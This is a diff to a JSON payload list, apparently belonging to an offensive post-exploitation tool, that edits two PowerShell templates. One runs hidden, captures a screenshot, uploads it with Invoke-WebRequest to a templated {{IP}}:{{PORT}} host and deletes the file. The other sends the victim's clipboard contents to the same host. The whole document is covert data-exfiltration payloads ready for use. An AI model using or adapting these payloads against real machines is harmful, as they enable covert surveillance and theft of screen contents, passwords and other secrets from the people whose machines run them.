@@ -22,11 +22,11 @@
     },
     {
       "payload_name": "Fetch current screenshot",
-      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$a=''system.windows.forms'';$b=''{PRTSC}'';$c=''c:\\windows\\temp\\{{FILENAME}}'';$d=''image/png'';\n[void][reflection.assembly]::loadwithpartialname($a)\n[system.windows.forms.sendkeys]::sendwait($b)\n$screenshot = $c; Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList $screenshot; Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Infile $screenshot -ContentType $d\n\"; Remove-Item -Path $screenshot"
+      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$a=''system.windows.forms'';$b=''{PRTSC}'';$c=''c:\\windows\\temp\\{{FILENAME}}'';$d=''image/png'';\n[void][reflection.assembly]::loadwithpartialname($a)\n[system.windows.forms.sendkeys]::sendwait($b)\n$screenshot = $c; Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList $screenshot; Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Infile $screenshot -ContentType $d\n; Remove-Item -Path $screenshot\""
     },
     {
       "payload_name": "Fetch current clipboard",
-      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$c = @{clipboardData = Get-Clipboard}; Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Body $c\""
+      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Body @{clipboardData = Get-Clipboard};\""
     }
   ]
 }
